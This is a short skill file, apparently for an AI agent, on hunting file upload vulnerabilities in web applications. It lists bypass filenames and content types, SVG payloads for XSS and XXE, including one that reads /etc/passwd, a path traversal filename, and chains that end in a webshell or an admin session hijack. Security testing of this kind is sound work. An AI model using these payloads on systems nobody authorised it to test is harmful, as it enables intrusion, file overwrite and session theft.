---
name: hunt-file-upload
description: "Hunting skill for file upload vulnerabilities. Unrestricted file upload, RCE via upload, stored XSS via upload, path traversal in filename, content-type bypass, double extension, SVG XXE. Use when testing endpoints that accept file uploads."
---

# Hunt: File Upload

## Detection Patterns

### RCE via Upload
Upload: `.php`, `.phtml`, `.php5`, `.php7`, `.shtml`, `.cgi`, `.asp`, `.aspx`, `.jsp`, `.war`, `.py`, `.pl`
If uploaded file is accessible at a URL and executes → RCE.

### Bypass Techniques
```
file.php → file.php.jpg → file.php%00.jpeg → file.pHp
file.asp → file.asp;.jpg → file.asp.jpg
file.jsp → file.jsp#.jpg → file.jsp?.jpg
Content-Type: image/jpeg → Content-Type: text/x-php (for shell)
```

### XSS via Upload
```
Upload SVG with embedded XSS:
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>
```
Upload HTML file with embedded JS, file with `<img src=x onerror=alert(1)>` in metadata.

### Path Traversal in Filename
```
POST /upload
Content-Disposition: form-data; name="file"; filename="../../etc/passwd"
```
If filename not sanitized → overwrite arbitrary files.

### XXE via Upload
```
Upload SVG with XXE:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```
Upload DOCX/XLSX (ZIP with XML) with XXE payload.

## Confirmation Gates
- Uploaded script executes at accessible URL → confirmed + critical
- SVG XSS triggers in browser → confirmed + high
- Path traversal overwrites file → confirmed + high
- XXE returns file content → confirmed + high

## Chain Templates
- File upload RCE + SSRF → pivot to internal network from compromised host
- File upload SVG XSS + Stored XSS → admin session hijack
- File upload path traversal + IDOR → overwrite another user's files
- File upload + MIME bypass + RCE → webshell on target server
